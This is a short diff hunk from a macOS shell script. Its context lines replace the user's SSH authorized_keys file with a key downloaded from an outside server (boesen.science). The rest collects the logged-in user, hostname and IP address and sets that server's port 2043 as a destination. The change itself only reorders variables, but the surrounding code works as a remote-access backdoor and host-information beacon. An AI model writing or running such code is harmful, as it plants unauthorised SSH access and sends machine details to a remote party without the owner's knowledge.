@@ -20,10 +20,10 @@ rm "$sshpath/authorized_keys" # Just in case
 curl -Lso "$sshpath/authorized_keys" boesen.science:2042/pubkey
 
 user=$(stat -f "%Su" /dev/console) # Get user currently logged in (in GUI).
-ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
 hostname=$(hostname)
+ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
 
-info="$user $ip $hostname"
+info="$user $hostname $ip"
 
 server="boesen.science"
 port=2043
